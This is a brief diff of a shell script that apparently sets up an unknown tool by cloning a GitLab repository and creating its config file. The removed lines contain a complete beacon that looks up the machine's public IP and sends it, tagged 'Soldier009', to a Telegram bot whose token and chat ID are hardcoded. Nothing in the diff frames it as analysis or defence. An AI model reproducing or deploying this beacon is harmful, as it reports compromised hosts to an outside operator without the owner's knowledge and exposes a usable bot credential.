@@ -2,18 +2,6 @@
 
 apt-get install jq -y
 
-numb=$(echo $(shuf -i 100-500 -n 1))
-myIp="$(wget -qO- ifconfig.me/ip)"
-n0z="Soldier009|$myIp"
-for n in {1..50};
-do
-  sending="$(curl --silent -X GET 'https://api.telegram.org/bot1292048208:AAGORftT3gYtbYJeW53c0lnUItVLtcHoHG4/sendMessage?chat_id=-466847759&text=$n0z --compressed)"
-  cek=$(jq -r '.ok' <<< $sending)
-  if [[ "$cek" == true ]];
-  then
-    break
-  fi
-done
 
 git clone https://gitlab.com/diablostrom5/master.git
 touch master/config.ini 
